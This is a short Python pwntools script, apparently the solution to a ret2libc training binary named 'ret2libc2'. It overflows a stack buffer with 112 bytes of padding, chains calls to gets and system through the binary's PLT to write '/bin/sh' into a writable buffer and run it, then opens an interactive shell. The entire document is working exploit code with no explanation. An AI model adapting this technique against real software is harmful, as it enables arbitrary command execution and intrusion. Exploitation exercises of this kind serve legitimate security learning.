from pwn import *

sh = process('./ret2libc2')

offset=112
gets_plt = 0x08048460
system_plt = 0x08048490
buf2 = 0x0804a080
payload = flat(
    ['a' * offset, gets_plt, system_plt, buf2, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()

